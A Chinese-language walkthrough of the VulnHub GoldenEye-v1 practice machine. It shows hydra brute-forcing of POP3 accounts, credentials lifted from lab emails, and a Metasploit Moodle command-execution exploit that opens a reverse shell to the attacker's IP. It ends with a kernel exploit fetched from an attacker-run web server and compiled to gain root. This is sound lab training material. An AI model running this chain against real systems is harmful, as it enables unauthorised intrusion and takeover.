    <span role="heading" aria-level="2">vulnhub靶机：GoldenEye-v1</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>扫描挖掘本地的IP地址信息：</p>
<p><code>nmap -sT  192.168.111.101</code></p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920190943395-1222405148.png" class="lazyload"><br>
发现开放了25,80端口</p>
<p>访问http://192.168.111.101:80<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920191152404-681387669.png" class="lazyload"><br>
提示可以访问/sev-home/ ,访问后让我们输入账号密码，查看页面原代码 访问/terminal.js<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920191408536-15847697.png" class="lazyload"><br>
提示账号Boris，Natalya和密码，将密码进行解码，登录/sev-home/<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920191623946-170877107.png" class="lazyload"><br>
得到提示：is very effective, we have configured our pop3 service to run on a very high non-default port<br>
使用nmap探测端口<br>
<code>nmap -p- 192.168.111.101 -T4</code><br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920191952484-1388930918.png" class="lazyload"><br>
<code>nmap -sS -sV -T4 -A -p55006,55007 192.168.111.101</code><br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920192015038-189308611.png" class="lazyload"><br>
这段信息看出这两个端口开放了pop3的mail服务的，通过/terminal.js页面，在注释中发现一条内容，指出目标系统正在使用默认密码。<br>
我们已知账号，通过hydra爆破，账号为Boris，Natalya，写在uname.txt文件夹<br>
<code>hydra -L uname.txt -P /usr/share/wordlists/fasttrack.txt -s 192.168.111.101:55007 pop3</code><br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920192612914-1591494217.png" class="lazyload"><br>
用户：boris 密码：secret1!<br>
用户：natalya 密码：bird<br>
通过NC登录pop3查看邮件信封内容枚举：<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920193116410-1396806314.png" class="lazyload"><br>
查看前三个邮件<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920193147778-104564194.png" class="lazyload"><br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920193227777-579241277.png" class="lazyload"><br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920193319717-108363832.png" class="lazyload"><br>
第二封来自用户“natalya”，称她可以破坏鲍里斯的密码。<br>
第三封邮件可以看出有一份文件用了GoldenEye的访问代码作为附件进行发送，并保留在根目录中。但我们无法从此处阅读附件。<br>
继续登录natalva账号查看邮件<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920193500231-371354516.png" class="lazyload"><br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920193530828-962780509.png" class="lazyload"><br>
两封邮件：第一封邮件：<br>
娜塔莉亚，请你停止破解鲍里斯的密码。 此外，您是 GNO 培训主管。 一旦学生被指定给你，我就会给你发电子邮件。<br>
此外，请注意可能的网络漏洞。 我们获悉，一个名为 Janus 的犯罪集团正在追捕 GoldenEye。</p>
<p>第二封邮件：<br>
好的 Natalyn 我有一个新学生给你。 由于这是一个新系统，如果您看到任何配置问题，请告诉我或鲍里斯，尤其是它与安全有关的问题……即使不是，也只需以“安全”为幌子输入……它就会 轻松升级变更单:)<br>
好的，用户信用是：<br>
用户名：xenia<br>
密码：RCP90rulez！<br>
鲍里斯验证了她是一个有效的承包商，所以只需创建帐户好吗？<br>
如果您没有外部内部域的 URL：severnaya-station.com/gnocertdir<br>
**请务必编辑您的主机文件，因为您通常在远程离线工作....<br>
由于您是 Linux 用户，因此只需将此服务器 IP 指向 /etc/hosts 中的 severnaya-station.com。</p>
<p>我们来设置本地hosts文件<br>
<code>nano /etc/hosts</code><br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920193938361-957997175.png" class="lazyload"><br>
进行修改</p>
<p>访问severnaya-station.com/gnocertdir地址：<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920194439211-1042376275.png" class="lazyload"><br>
点击：Intro to GoldenEye可以进行登录，使用natalya邮箱第二封邮件获得的用户名密码登录：<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920194629650-831935764.png" class="lazyload"><br>
登录成功！<br>
Home / ▶ My profile / ▶ Messages ---&gt;发现有一封邮件，内容发现用户名doak<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920194928296-134521381.png" class="lazyload"><br>
爆破用户名doak的邮件<br>
hydra -L uname.txt -P /usr/share/wordlists/fasttrack.txt 192.168.111.101 -s 55007 pop3<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920195509493-418451203.png" class="lazyload"><br>
得到密码，继续使用nc登录pop3，访问邮件，得到信息：<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920195809839-593157511.png" class="lazyload"><br>
邮件消息说，为我们提供了更多登录凭据以登录到应用程序。让我们尝试使用这些凭据登录。<br>
用户名：dr_doak<br>
密码：4England!</p>
<p>使用新账号登录cms：<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920195940298-1787568071.png" class="lazyload"><br>
登录成功，在：Home / ▶ My home 右边发现： s3cret.txt 另外发现这是Moodle使用的2.2.3版本<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920200039885-1010526651.png" class="lazyload"><br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920200140588-1743893722.png" class="lazyload"><br>
访问severnaya-station.com/dir007key/for-007.jpg<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920200236471-1584075927.png" class="lazyload"><br>
下载到本地：<br>
<code>wget http://severnaya-station.com/dir007key/for-007.jpg</code><br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920200623619-1656864678.png" class="lazyload"><br>
根据邮件提示让我们检查图片内容，下载图片后，我们可以使用：<br>
binwalk（路由逆向分析工具）<br>
exiftool（图虫）<br>
strings（识别动态库版本指令）<br>
等查看jpg文件底层内容！<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920200916350-1607063677.png" class="lazyload"><br>
base64解码<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920201008664-1375946873.png" class="lazyload"><br>
线索中说，这是管理员的密码，通过admin账号登录cms<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920201125065-1925351573.png" class="lazyload"><br>
登录成功，可以搜索此版本的漏洞，我使用rce进行利用<br>
使用msf<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920203511506-791143012.png" class="lazyload"></p>
<p>msfconsole                        ---进入MSF框架攻击界面<br>
search moodle                     ---查找 moodle类型 攻击的模块<br>
use 1                             ---调用0  exploit/multi/http/moodle_cmd_exec调用攻击脚本<br>
set username admin                ---设置用户名：admin<br>
set password xWinter1995x!        ---设置密码：xWinter1995x!<br>
set rhost severnaya-station.com   ---设置：rhosts severnaya-station.com<br>
set targeturi /gnocertdir         ---设置目录： /gnocertdir<br>
set payload cmd/unix/reverse      ---设置payload：cmd/unix/reverse<br>
set lhost 192.168.4.231           ---设置：lhost 192.168.4.231（需要本地IP）<br>
exploit  ----执行命令</p>
<p>成功拿下shell<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920203722897-608154604.png" class="lazyload"></p>
<p>进行内核提权：<br>
<code>uname -a</code><br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920204015021-1503212211.png" class="lazyload"><br>
<code>searchsploit 3.13</code><br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920204558226-788076336.png" class="lazyload"><br>
<code>cp /usr/share/exploitdb/exploits/linux/local/37292.c 1.c</code><br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920204711654-1829585270.png" class="lazyload"></p>
<p>无法进行GCC编译，需要改下脚本为cc<br>
gedit 1.c / nano 1.c      ---文本打开<br>
第143行将gcc改为cc    ---编写下<br>
然后在本目录下开启服务器：<br>
<code>python -m http.server 8081</code><br>
反弹shell中执行<code>wget http://192.168.111.25/1.c</code><br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920205341139-1805591335.png" class="lazyload"><br>
<code>cc 1.c shell</code><br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920210039198-1630672933.png" class="lazyload"><br>
<code>chmod 777 shell</code><br>
<code>./shell</code><br>
<code>whoami</code><br>
<code>cd /root</code><br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920210210952-1952048069.png" class="lazyload"><br>
打完收工<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250920210329930-1975198563.png" class="lazyload"></p>
